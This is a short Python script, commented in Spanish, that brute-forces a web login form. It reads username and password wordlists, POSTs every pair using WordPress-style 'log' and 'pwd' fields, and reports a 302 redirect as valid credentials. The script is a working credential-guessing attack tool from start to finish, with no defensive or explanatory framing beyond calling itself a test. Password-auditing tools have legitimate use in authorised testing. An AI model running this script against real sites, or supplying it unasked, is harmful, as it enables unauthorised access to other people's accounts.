import requests
from colorama import init, Fore
import time

# Inicializar colorama para Windows
init(autoreset=True)

url = input("Ingrese la URL de inicio de sesión: ")
usuarios = input("Ingrese el nombre del archivo con la lista de usuarios: ")
contrasenas = input("Ingrese el nombre del archivo con la lista de contraseñas: ")
credenciales_encontradas = False

# Leer usuarios y contraseñas desde los archivos
with open(usuarios, "r") as usuarios_file:
    usuarios = [line.strip() for line in usuarios_file]

with open(contrasenas, "r") as contrasenas_file:
    contrasenas = [line.strip() for line in contrasenas_file]

print(f"{Fore.YELLOW}Iniciando la prueba de fuerza bruta...\n{Fore.RESET}")

# Recorrer todas las posibles combinaciones de usuarios y contraseñas
for x_usuario in usuarios:
    for x_password in contrasenas:
        # Creamos una variable con los datos del POST
        data = {
            'log': x_usuario,
            'pwd': x_password
        }

        try:
            # Realizar la solicitud POST con allow_redirects=False para evitar redirecciones automáticas
            response = requests.post(url, data=data, allow_redirects=False)

            # Obtener el código de estado de la respuesta
            status_code = response.status_code

            # Verificar si el código de estado (302 correcto y 200 incorrecto)
            if status_code == 302:
                print(f"[+] Credenciales válidas: {Fore.RED}{x_usuario}:{x_password}{Fore.RESET}")
                credenciales_encontradas = True
                break  
            elif status_code == 200:
                print(f"[-] Credenciales incorrectas: {x_usuario}:{x_password}")
            else:
                print(f"[-] Error en la solicitud: Código de estado {status_code}")
        except requests.exceptions.RequestException as e:
            print("[-] Error en la solicitud:", e)

        
        time.sleep(1)
    # Si se encontraron las credenciales válidas, salir del bucle de usuarios
    if credenciales_encontradas:
        break

print(f"{Fore.YELLOW}\nPrueba de fuerza bruta completada.{Fore.RESET}")